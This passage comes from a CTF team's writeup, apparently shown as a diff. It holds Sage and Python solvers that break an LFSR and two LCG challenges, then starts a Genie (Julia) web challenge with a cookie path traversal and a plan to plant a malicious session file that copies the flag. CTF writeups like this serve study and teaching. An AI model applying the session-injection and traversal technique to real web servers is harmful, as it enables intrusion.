+<p>Where $\vec{k}$ is the constant in the source code written as a binary vector. With some linear algebra, we can write this as a matrix multiplication $\vec{s} \mapsto M\vec{s}$, but we got stuck here as we thought it is impossible to solve for $M^n\vec{s} = \vec{t}$, because of two reasons:</p>
+
+<ol>
+<li>We do not have the full matrix $M^n$</li>
+<li>Even if we do, it is infeasible to calculate discrete logarithms of $128\times 128$ matrices.</li>
+</ol>
+
+<p>As it turns out, both the assumptions are incorrect. Firstly, due to the special nature of $M$ being the representation of a Galois LFSR, we can treat $\vec{s}$ as an element of $\color{blue}{\mathbb{F}_{2^{128}}}$, and more specifically as a polynomial. To motivate this, we can look at the following examples: (writing vectors in row form from $s<em>0$ to $s</em>{127}$)</p>
+
+<p><span  class="math">\[\begin{align*} f(1, 0, 0, \ldots, 0, 0) &= (0, 1, 0, \ldots, 0, 0) \\ f(0, 0, 1, \ldots, 0, 0) &= f(0, 0, 1, \ldots, 0, 0) \\ &\vdots \\ f(0, 0, 0, \ldots 1, 0) &= f(0, 0, 0, \ldots, 0, 1) \\ f(0, 0, 0, \ldots, 0, 1) &= \vec{k} \end{align*}\]</span></p>
+
+<p>From the cyclic nature of the operation, we can treat the vector $(s_0, s<em>1, \ldots, s</em>{127})$ as polynomials in $\mathbb{F}_{2^{128}}$ as $s_0 + s_1x + s<em>2x^2 + \ldots + s</em>{127}x^{127}$ and $f(s) = xs$. Then since $x^{127}$ gets mapped to $k$ (as a polynomial), we can think of this as a modulo operation</p>
+
+<p><span  class="math">\[f(s) = (xs\mod x^{128} + k(x))\]</span></p>
+
+<p>Now the idea is clear. With the first $16$ bytes i.e. $128$ bits of keystream, we can form a polynomial of the state $t$, and we get the equation</p>
+
+<p><span  class="math">\[t \equiv x^n s \mod (x^{128} + k(x))\]</span></p>
+
+<p>We can directly compute the discrete logarithm $\log_x(\frac{t}{s})$. It is crucial to use pari's <code>.fflog</code> instead of sage's builtin <code>.log</code> method before Sage 9.5, as Sage uses generic PH-BSGS method to solve discrete logarithm in this case.</p>
+
+<p>There is a final trick where $x^{128} + k(x)$ is not irreducible but instead is in the form of $xP(x)$. We simply consider discrete logarithm mod $P(x)$ and the rest follows as seen from the modulo relation.</p>
+
+<p>Code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">k <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x5C2B76970103D4EEFCD4A2C681CC400D</span>
+init_s <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6BF1B9BAE2CA5BC9C7EF4BCD5AADBC47</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">to_poly</span>(s):
+    <span style="color:#66d9ef">return</span> sum(((s <span style="color:#f92672">&gt;&gt;</span> i) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> x<span style="color:#f92672">^</span>(<span style="color:#ae81ff">127</span> <span style="color:#f92672">-</span> i) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">128</span>))
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">to_int</span>(r):
+    <span style="color:#66d9ef">return</span> sum(int(x) <span style="color:#f92672">&lt;&lt;</span> (<span style="color:#ae81ff">127</span> <span style="color:#f92672">-</span> i) <span style="color:#66d9ef">for</span> i, x <span style="color:#f92672">in</span> enumerate(r<span style="color:#f92672">.</span>coefficients(sparse<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)))
+
+R<span style="color:#f92672">.&lt;</span>x<span style="color:#f92672">&gt;</span> <span style="color:#f92672">=</span> PolynomialRing(GF(<span style="color:#ae81ff">2</span>), <span style="color:#e6db74">&#39;x&#39;</span>)
+
+<span style="color:#75715e"># from other png files</span>
+png_header <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x89504e470d0a1a0a0000000d49484452</span>
+<span style="color:#75715e"># from flag.png.enc</span>
+known <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x9995611033e8bf22ae4defce1e53b92c</span>
+cur_s <span style="color:#f92672">=</span> to_poly(png_header <span style="color:#f92672">^^</span> known)
+
+<span style="color:#75715e"># extract modulus</span>
+modulus <span style="color:#f92672">=</span> R((x<span style="color:#f92672">^</span><span style="color:#ae81ff">128</span> <span style="color:#f92672">+</span> to_poly(k)) <span style="color:#f92672">/</span> x)
+
+<span style="color:#75715e"># setup fields and convert</span>
+print(modulus<span style="color:#f92672">.</span>factor())
+Q<span style="color:#f92672">.&lt;</span>x<span style="color:#f92672">&gt;</span> <span style="color:#f92672">=</span> GF(<span style="color:#ae81ff">2</span><span style="color:#f92672">^</span><span style="color:#ae81ff">127</span>, modulus<span style="color:#f92672">=</span>modulus)
+cur_sQ <span style="color:#f92672">=</span> Q(cur_s)
+init_sQ <span style="color:#f92672">=</span> Q(to_poly(init_s))
+
+<span style="color:#75715e"># discrete log</span>
+dlog <span style="color:#f92672">=</span> ZZ(pari<span style="color:#f92672">.</span>fflog(Q(cur_sQ <span style="color:#f92672">/</span> init_sQ), Q(x)))
+print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>dlog <span style="color:#e6db74">= }</span><span style="color:#e6db74">&#34;</span>)
+<span style="color:#66d9ef">assert</span> Q(x)<span style="color:#f92672">^</span>dlog <span style="color:#f92672">*</span> init_sQ <span style="color:#f92672">==</span> Q(cur_sQ)
+
+<span style="color:#75715e"># however, calculations have to be done in the original modulus</span>
+modulus <span style="color:#f92672">*=</span> R(x)
+cur_s <span style="color:#f92672">=</span> R(to_poly(init_s))
+
+<span style="color:#75715e"># decrypt flag</span>
+enc <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;flag.png.enc&#39;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>)<span style="color:#f92672">.</span>read()
+keystream <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+<span style="color:#66d9ef">while</span> len(keystream) <span style="color:#f92672">&lt;</span> len(enc):
+    cur_s <span style="color:#f92672">=</span> cur_s <span style="color:#f92672">*</span> pow(R(x), dlog, modulus) <span style="color:#f92672">%</span> modulus
+    keystream <span style="color:#f92672">+=</span> to_int(cur_s)<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">16</span>, <span style="color:#e6db74">&#34;big&#34;</span>)
+
+dec <span style="color:#f92672">=</span> bytes([x <span style="color:#f92672">^^</span> y <span style="color:#66d9ef">for</span> x, y <span style="color:#f92672">in</span> zip(enc, keystream)])
+open(<span style="color:#e6db74">&#39;flag.png&#39;</span>, <span style="color:#e6db74">&#39;wb&#39;</span>)<span style="color:#f92672">.</span>write(dec)</code></pre></div>
+<p>Flag: <code>TSJ{discrete_log_in_a_finite_field}</code></p>
+
+<h2 id="cipher-switching-service">Cipher Switching Service<a hidden class="anchor" aria-hidden="true" href="#cipher-switching-service">#</a></h2>
+
+<p><em>Solved by Mystiz; writeup compiled by Mystiz.</em></p>
+
+<p><a href="https://mystiz.hk/posts/2022-03-01-tsjctf-1/">https://mystiz.hk/posts/2022-03-01-tsjctf-1/</a> (will copy the content here as well)</p>
+
+<h2 id="signature">Signature<a hidden class="anchor" aria-hidden="true" href="#signature">#</a></h2>
+
+<p><em>Solved by Mystiz; writeup compiled by Mystiz.</em></p>
+
+<p><a href="https://mystiz.hk/posts/2022-03-02-tsjctf-2/">https://mystiz.hk/posts/2022-03-02-tsjctf-2/</a> (will copy the content here as well)</p>
+
+<h2 id="rng">RNG++<a hidden class="anchor" aria-hidden="true" href="#rng">#</a></h2>
+
+<p><em>Solved by Mystiz; writeup compiled by grhkm and Mystiz.</em></p>
+
+<h3 id="challenge-summary-1">Challenge Summary<a hidden class="anchor" aria-hidden="true" href="#challenge-summary-1">#</a></h3>
+
+<p>Suppose that we have a linear congruence generator $s_{k+1} = (a \cdot s_k + c)\ (\text{mod}\ m)$ for all $k \geq 0$. We have a transcript file that contains $m$, $a$ and $c$ ($a$ and $c$ are primes less than $m$). We are also given a number of ciphertexts. The $k$-th ciphertext $c_k$ ($k \geq 1$) is computed by:</p>
+
+<p><span  class="math">\[c_k = m_k \oplus s_k.\]</span></p>
+
+<p>Here $m_k$ is the $k$-th message. $m_1$ is the flag with length $l$ and $m_2, m_3, ...$ are strings of length $l$ those contain digits only (for example, <code>m2 = b&quot;133765536&quot;</code>). The goal is to recover $m_1$.</p>
+
+<p>In this challenge, the parameters are given below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">l <span style="color:#f92672">=</span> <span style="color:#ae81ff">32</span>
+<span style="color:#75715e"># m = 2^256</span>
+m <span style="color:#f92672">=</span> <span style="color:#ae81ff">115792089237316195423570985008687907853269984665640564039457584007913129639936</span>
+a <span style="color:#f92672">=</span> <span style="color:#ae81ff">86063744400850297667628777812749377798737932751281716573108946773081904916117</span>
+c <span style="color:#f92672">=</span> <span style="color:#ae81ff">64628347935200268328771003490390752890895505335867420334664237461501166025747</span>
+ciphertexts <span style="color:#f92672">=</span> [
+    <span style="color:#ae81ff">0x59fe4b12f3f85e6756189ba75cc7bfc6ebc5b9a9e0f008623dd008f9632927c2</span>,
+    <span style="color:#ae81ff">0x413c3d70d09e08d2e5b10b51800b65571f3afde82ca233351cddae591c3996d2</span>,
+    <span style="color:#ae81ff">0xea4aac7bf92c87cad6584d4cd8337af93afc2fd42314c02298afcdd26ec42771</span>,
+    <span style="color:#ae81ff">0x8c6425226df355ccd09cc5c968b3cfa8fd606179346a66841ee5b7f6e6425409</span>,
+    <span style="color:#ae81ff">0x16cd6c30d1bff2dc1ba2e6257fb37fd5c477d0952e254aa3c5c301b0e43846c8</span>
+]</code></pre></div>
+<h3 id="solution-1">Solution<a hidden class="anchor" aria-hidden="true" href="#solution-1">#</a></h3>
+
+<p>As noted, we notice that the random strings $m_i, i\geq 2$ consists of digits only. We further note that since the modulus $m = 2^{256}$ is a power of $2$, we have that</p>
+
+<p><span  class="math">\[m_1 \oplus (AS + C) \equiv c_1 \mod 2^{256}\]</span></p>
+
+<p><span  class="math">\[\implies \begin{cases} m_1[:1] \oplus (AS + C\mod 2^8) &\equiv c_1 \mod 2^8 \\ m_1[:2] \oplus (AS + C\mod 2^{16}) &\equiv c_1 \mod 2^{16} \\ m_1[:3] \oplus (AS + C\mod 2^{24}) &\equiv c_1 \mod 2^{24} \\ &\vdots \end{cases}\]</span></p>
+
+<p>Where $S' \in [0, 2^{8i}]$ is the restricted $S$, and equations are similar for $m_2, m_3, m_4$. Therefore, we can test $i = 1, 2, \ldots, 32$, bruteforce the corresponding character $c_1[i]$ (which has $10$ choices), and use recursion.</p>
+
+<h4 id="solution-script-2">Solution script<a hidden class="anchor" aria-hidden="true" href="#solution-script-2">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">m <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">**</span><span style="color:#ae81ff">256</span>
+a <span style="color:#f92672">=</span> <span style="color:#ae81ff">86063744400850297667628777812749377798737932751281716573108946773081904916117</span>
+c <span style="color:#f92672">=</span> <span style="color:#ae81ff">64628347935200268328771003490390752890895505335867420334664237461501166025747</span>
+cs <span style="color:#f92672">=</span> [
+    <span style="color:#ae81ff">0x59fe4b12f3f85e6756189ba75cc7bfc6ebc5b9a9e0f008623dd008f9632927c2</span>,
+    <span style="color:#ae81ff">0x413c3d70d09e08d2e5b10b51800b65571f3afde82ca233351cddae591c3996d2</span>,
+    <span style="color:#ae81ff">0xea4aac7bf92c87cad6584d4cd8337af93afc2fd42314c02298afcdd26ec42771</span>,
+    <span style="color:#ae81ff">0x8c6425226df355ccd09cc5c968b3cfa8fd606179346a66841ee5b7f6e6425409</span>,
+    <span style="color:#ae81ff">0x16cd6c30d1bff2dc1ba2e6257fb37fd5c477d0952e254aa3c5c301b0e43846c8</span>,
+]
+
+nums <span style="color:#f92672">=</span> set(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0123456789&#39;</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">attempt</span>(current<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>, progress<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>):
+    <span style="color:#66d9ef">if</span> progress <span style="color:#f92672">==</span> <span style="color:#ae81ff">32</span>:
+        m1 <span style="color:#f92672">=</span> current
+        s1 <span style="color:#f92672">=</span> m1 <span style="color:#f92672">^</span> cs[<span style="color:#ae81ff">1</span>]
+        s0 <span style="color:#f92672">=</span> pow(a, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, m) <span style="color:#f92672">*</span> (s1 <span style="color:#f92672">-</span> c) <span style="color:#f92672">%</span> m
+        m0 <span style="color:#f92672">=</span> s0 <span style="color:#f92672">^</span> cs[<span style="color:#ae81ff">0</span>]
+        flag <span style="color:#f92672">=</span> int<span style="color:#f92672">.</span>to_bytes(m0, progress, <span style="color:#e6db74">&#39;big&#39;</span>)
+        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>flag <span style="color:#e6db74">= }</span><span style="color:#e6db74">&#39;</span>)
+        <span style="color:#66d9ef">return</span>
+
+    mod <span style="color:#f92672">=</span> <span style="color:#ae81ff">256</span><span style="color:#f92672">**</span>(progress <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)
+    <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">10</span>):
+        m1 <span style="color:#f92672">=</span> current <span style="color:#f92672">+</span> <span style="color:#ae81ff">256</span><span style="color:#f92672">**</span>progress <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x30</span> <span style="color:#f92672">+</span> x)
+        s1 <span style="color:#f92672">=</span> (m1 <span style="color:#f92672">^</span> cs[<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">%</span> mod
+        s2 <span style="color:#f92672">=</span> (a <span style="color:#f92672">*</span> s1 <span style="color:#f92672">+</span> c) <span style="color:#f92672">%</span> mod
+        m2 <span style="color:#f92672">=</span> (s2 <span style="color:#f92672">^</span> cs[<span style="color:#ae81ff">2</span>]) <span style="color:#f92672">%</span> mod
+        <span style="color:#66d9ef">if</span> set(int<span style="color:#f92672">.</span>to_bytes(m2, progress<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#39;big&#39;</span>)) <span style="color:#f92672">|</span> nums <span style="color:#f92672">!=</span> nums: <span style="color:#66d9ef">continue</span>
+        s3 <span style="color:#f92672">=</span> (a <span style="color:#f92672">*</span> s2 <span style="color:#f92672">+</span> c) <span style="color:#f92672">%</span> mod
+        m3 <span style="color:#f92672">=</span> (s3 <span style="color:#f92672">^</span> cs[<span style="color:#ae81ff">3</span>]) <span style="color:#f92672">%</span> mod
+        <span style="color:#66d9ef">if</span> set(int<span style="color:#f92672">.</span>to_bytes(m3, progress<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#39;big&#39;</span>)) <span style="color:#f92672">|</span> nums <span style="color:#f92672">!=</span> nums: <span style="color:#66d9ef">continue</span>
+        s4 <span style="color:#f92672">=</span> (a <span style="color:#f92672">*</span> s3 <span style="color:#f92672">+</span> c) <span style="color:#f92672">%</span> mod
+        m4 <span style="color:#f92672">=</span> (s4 <span style="color:#f92672">^</span> cs[<span style="color:#ae81ff">4</span>]) <span style="color:#f92672">%</span> mod
+        <span style="color:#66d9ef">if</span> set(int<span style="color:#f92672">.</span>to_bytes(m4, progress<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#39;big&#39;</span>)) <span style="color:#f92672">|</span> nums <span style="color:#f92672">!=</span> nums: <span style="color:#66d9ef">continue</span>
+        attempt(m1, progress<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)
+
+attempt()
+<span style="color:#75715e"># TSJ{this_is_a_boring_challenge_sorry}</span></code></pre></div>
+<h2 id="rng-1">RNG+++<a hidden class="anchor" aria-hidden="true" href="#rng-1">#</a></h2>
+
+<p><em>Solved by Mystiz; writeup compiled by Mystiz.</em></p>
+
+<h3 id="challenge-summary-2">Challenge Summary<a hidden class="anchor" aria-hidden="true" href="#challenge-summary-2">#</a></h3>
+
+<p>The challenge has the same setting as <em>RNG++</em> with a different set of parameters:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">l <span style="color:#f92672">=</span> <span style="color:#ae81ff">24</span>
+<span style="color:#75715e"># m = 2^192 + 133 = NextPrime(2^192)</span>
+m <span style="color:#f92672">=</span> <span style="color:#ae81ff">6277101735386680763835789423207666416102355444464034513029</span>
+a <span style="color:#f92672">=</span> <span style="color:#ae81ff">5122535491606943208710238231068027098883286375061143870757</span>
+c <span style="color:#f92672">=</span> <span style="color:#ae81ff">3210047385276654404868184757570927620150853542689320481571</span>
+ciphertexts <span style="color:#f92672">=</span> [
+    <span style="color:#ae81ff">0x0b8bb965128d77d56f2efc1b7ec640699927dbb711d13a41</span>,
+    <span style="color:#ae81ff">0x5c894788bdf78b2b7bf4081270ebb495b95c90ab6a7fb3f0</span>,
+    <span style="color:#ae81ff">0x737d9ea03e9fd30eeb2176aa588480c0b798682a7f4013fc</span>,
+    <span style="color:#ae81ff">0x299bd16cef01a65b467d5e3dfd46ec62b4e29f8994b1a4c0</span>,
+    <span style="color:#ae81ff">0xaa9b3e5f5635b7cab0eaa50aa854223975bfc10976a5b198</span>,
+    <span style="color:#ae81ff">0xdfdcac905116a9f8ac0fb9bdf8da193616b58713daa7dade</span>,
+    <span style="color:#ae81ff">0x520b8ea46a7ad0a590064b6f067b9b3962c4874541eb34f0</span>,
+    <span style="color:#ae81ff">0xa490b4afaf268540b0ecafff938b4531ad06b5706a4d68e6</span>,
+    <span style="color:#ae81ff">0x087726f7bf592ad0ee92e78773dc860f4975766f382bf192</span>
+]</code></pre></div>
+<h3 id="solution-2">Solution<a hidden class="anchor" aria-hidden="true" href="#solution-2">#</a></h3>
+
+<p>The idea is similar to <em>Signature</em>, which attempts to remove <code>XOR</code> operations of a relation and convert it to affine relation. The below script would recover the seed $s_0$ from ciphertexts.</p>
+
+<div class="alert warning">
+  The weights are pretty hard to set though&hellip; @maple3142 used BKZ and it would return a better set of vectors, effectively recovering $s_0$ without much configuration to the weights.
+</div>
+  
+
+<p>After we have the seed recovered from LLL, we can decrypt $c_1$ and yield the flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">TSJ{sorry_for_the_broken_ver}</code></pre></div>
+<h4 id="solution-script-3">Solution script<a hidden class="anchor" aria-hidden="true" href="#solution-script-3">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">m <span style="color:#f92672">=</span> <span style="color:#ae81ff">6277101735386680763835789423207666416102355444464034513029</span> <span style="color:#75715e"># 2^192 + 133</span>
+a <span style="color:#f92672">=</span> <span style="color:#ae81ff">5122535491606943208710238231068027098883286375061143870757</span>
+c <span style="color:#f92672">=</span> <span style="color:#ae81ff">3210047385276654404868184757570927620150853542689320481571</span>
+cs <span style="color:#f92672">=</span> list(map(int, [
+    <span style="color:#ae81ff">0x0b8bb965128d77d56f2efc1b7ec640699927dbb711d13a41</span>,
+    <span style="color:#ae81ff">0x5c894788bdf78b2b7bf4081270ebb495b95c90ab6a7fb3f0</span>,
+    <span style="color:#ae81ff">0x737d9ea03e9fd30eeb2176aa588480c0b798682a7f4013fc</span>,
+    <span style="color:#ae81ff">0x299bd16cef01a65b467d5e3dfd46ec62b4e29f8994b1a4c0</span>,
+    <span style="color:#ae81ff">0xaa9b3e5f5635b7cab0eaa50aa854223975bfc10976a5b198</span>,
+    <span style="color:#ae81ff">0xdfdcac905116a9f8ac0fb9bdf8da193616b58713daa7dade</span>,
+    <span style="color:#ae81ff">0x520b8ea46a7ad0a590064b6f067b9b3962c4874541eb34f0</span>,
+    <span style="color:#ae81ff">0xa490b4afaf268540b0ecafff938b4531ad06b5706a4d68e6</span>,
+    <span style="color:#ae81ff">0x087726f7bf592ad0ee92e78773dc860f4975766f382bf192</span>,
+]))
+
+n <span style="color:#f92672">=</span> len(cs)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
+
+P<span style="color:#f92672">.&lt;</span>s0<span style="color:#f92672">&gt;</span> <span style="color:#f92672">=</span> PolynomialRing(GF(m))
+
+ss <span style="color:#f92672">=</span> [s0]
+<span style="color:#66d9ef">while</span> len(ss)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;=</span> len(cs):
+    ss<span style="color:#f92672">.</span>append(a <span style="color:#f92672">*</span> ss[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> c)
+    <span style="color:#66d9ef">try</span>:
+        ss[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> ss[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">%</span> m
+    <span style="color:#66d9ef">except</span>:
+        <span style="color:#66d9ef">pass</span>
+ss <span style="color:#f92672">=</span> ss[<span style="color:#ae81ff">1</span>:]
+
+MASK <span style="color:#f92672">=</span> int<span style="color:#f92672">.</span>from_bytes(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">24</span>, <span style="color:#e6db74">&#39;big&#39;</span>)
+
+weights  <span style="color:#f92672">=</span> [<span style="color:#ae81ff">2</span><span style="color:#f92672">^</span><span style="color:#ae81ff">256</span> <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>)]    <span style="color:#75715e"># all zeros</span>
+weights <span style="color:#f92672">+=</span> [<span style="color:#ae81ff">2</span><span style="color:#f92672">^</span><span style="color:#ae81ff">192</span>, <span style="color:#ae81ff">1</span>]                   <span style="color:#75715e"># 1, s0  (192 bit)</span>
+weights <span style="color:#f92672">+=</span> [<span style="color:#ae81ff">2</span><span style="color:#f92672">^</span><span style="color:#ae81ff">192</span> <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">24</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>)] <span style="color:#75715e"># rki&#39;s (-15 ~ 15)</span>
+
+
+A <span style="color:#f92672">=</span> Matrix(ZZ, <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">25</span><span style="color:#f92672">*</span>n)
+Q <span style="color:#f92672">=</span> diagonal_matrix(weights)
+
+<span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(n):
+    vj, uj <span style="color:#f92672">=</span> map(int, ss[j<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>coefficients()) 
+
+    <span style="color:#66d9ef">if</span> <span style="color:#66d9ef">True</span>:
+        A[<span style="color:#ae81ff">0</span>,        j]   <span style="color:#f92672">=</span> vj <span style="color:#f92672">-</span> (cs[j<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">^^</span>MASK)
+        A[<span style="color:#ae81ff">1</span>,        j]   <span style="color:#f92672">=</span> uj
+
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">24</span>):
+        A[<span style="color:#ae81ff">2</span><span style="color:#f92672">+</span><span style="color:#ae81ff">24</span><span style="color:#f92672">*</span>j<span style="color:#f92672">+</span>i, j]   <span style="color:#f92672">=</span> <span style="color:#ae81ff">256</span><span style="color:#f92672">**</span>i
+
+    <span style="color:#66d9ef">if</span> <span style="color:#66d9ef">True</span>:
+        A[<span style="color:#ae81ff">2</span><span style="color:#f92672">+</span><span style="color:#ae81ff">24</span><span style="color:#f92672">*</span>n<span style="color:#f92672">+</span>j, j]   <span style="color:#f92672">=</span> m
+
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">24</span><span style="color:#f92672">*</span>n):
+        A[i,        n<span style="color:#f92672">+</span>i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+
+A <span style="color:#f92672">*=</span> Q
+A <span style="color:#f92672">=</span> A<span style="color:#f92672">.</span>LLL()
+A <span style="color:#f92672">/=</span> Q
+
+<span style="color:#66d9ef">for</span> row <span style="color:#f92672">in</span> A:
+    <span style="color:#66d9ef">if</span> list(row[:n]) <span style="color:#f92672">!=</span> [<span style="color:#ae81ff">0</span> <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(n)]: <span style="color:#66d9ef">continue</span>
+    <span style="color:#66d9ef">if</span> row[n] <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>: row <span style="color:#f92672">=</span> <span style="color:#f92672">-</span>row
+    <span style="color:#66d9ef">if</span> row[n] <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>: <span style="color:#66d9ef">continue</span>
+
+    s0 <span style="color:#f92672">=</span> int(row[n<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">%</span> m)
+    rs <span style="color:#f92672">=</span> row[n<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>:]
+
+    <span style="color:#66d9ef">if</span> min(rs) <span style="color:#f92672">&lt;</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">15</span>: <span style="color:#66d9ef">continue</span>
+    <span style="color:#66d9ef">if</span> max(rs) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">15</span>: <span style="color:#66d9ef">continue</span>
+    
+    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>s0 <span style="color:#e6db74">= }</span><span style="color:#e6db74">&#39;</span>)
+    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>rs <span style="color:#e6db74">= }</span><span style="color:#e6db74">&#39;</span>)
+    print()</code></pre></div>
+<h2 id="genie">Genie<a hidden class="anchor" aria-hidden="true" href="#genie">#</a></h2>
+
+<p><em>Solved by grkhm, Mystiz and Ozetta; writeup compiled by Mystiz and Ozetta.</em></p>
+
+<p>The challenge is a website developed using <em>Genie</em> Framework, which is based on <em>Julia</em>. The website allows user to upload files and it stores the file list to the session.</p>
+
+<h3 id="the-first-steps">The first steps<a hidden class="anchor" aria-hidden="true" href="#the-first-steps">#</a></h3>
+
+<p><em>From Mystiz's perspective</em></p>
+
+<p>I noticed this challenge after it is tagged with &quot;crypto&quot;. Since the source code for the web server (<code>main.jl</code>) is pretty short, I suspect that we should be looking for a bug from the <a href="https://github.com/GenieFramework/Genie.jl/tree/v4.15.2"><em>Genie</em></a> framework.</p>
+
+<p>One use of crypto in <em>Genie</em> is their cookie-session management. In short, cookies are ciphertexts of the session ID. The session ID corresponds to a file in the <code>/app/sessions</code> folder. In pseudocode:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># key and iv are fixed</span>
+
+cookie <span style="color:#f92672">=</span> aes_cbc_encrypt(plaintext<span style="color:#f92672">=</span>session_id, key<span style="color:#f92672">=</span>key, iv<span style="color:#f92672">=</span>iv)
+session_file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/app/sessions/&#39;</span> <span style="color:#f92672">+</span> session_id</code></pre></div>
+<p>Seeing AES-CBC is being used, I suspected that there is a padding oracle vulnerability... After that, I deployed an instance locally with key and IV hardcoded. I found that we can set the session ID to be <code>../uploads/session.txt</code> and it would read my uploaded <code>session.txt</code> as the session content. I drafted an attack flow and get the web guy (the unbeatable <em>Ozetta</em>) involved:</p>
+
+<ol>
+<li>Upload <code>session.txt</code> with a malicious session that will copy the flag to <code>uploads/session.txt</code></li>
+<li>Set the session to point to <code>../uploads/session.txt</code></li>
+<li>Visit the page for the command in the session to execute</li>
+<li>Go to <code>http://[HOST]/uploads/flag</code> for the flag</li>
+</ol>
+
+<p>By the way, <em>grhkm</em> asked if we could upload a file called <code>../f</code> early on. I quickly rejected his idea. I was so wrong... More on that later.</p>
+
+<h3 id="crafting-a-malicious-session-file">Crafting a malicious session file<a hidden class="anchor" aria-hidden="true" href="#crafting-a-malicious-session-file">#</a></h3>
+
+<p><em>From Ozetta's perspective</em></p>
+
+<p>Mystiz et al. found that the session id stored in cookies (<code>__geniesid</code>) is an encrypted filename of the session file in the server. The encryption is using a secret token, which is random whenever the server instance is created:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-julia" data-lang="julia">Genie<span style="color:#f92672">.</span>secret_token!(sha256(randstring(<span style="color:#ae81ff">256</span>)) <span style="color:#f92672">|&gt;</span> bytes2hex)</code></pre></div>
+<p>Apparently we need to specify the <code>__geniesid</code> to point to the file we uploaded to do something interesting.
+What kind of thing we should do? We found that the sesion file is in a serialized format that starts with &quot;7JL&quot;:
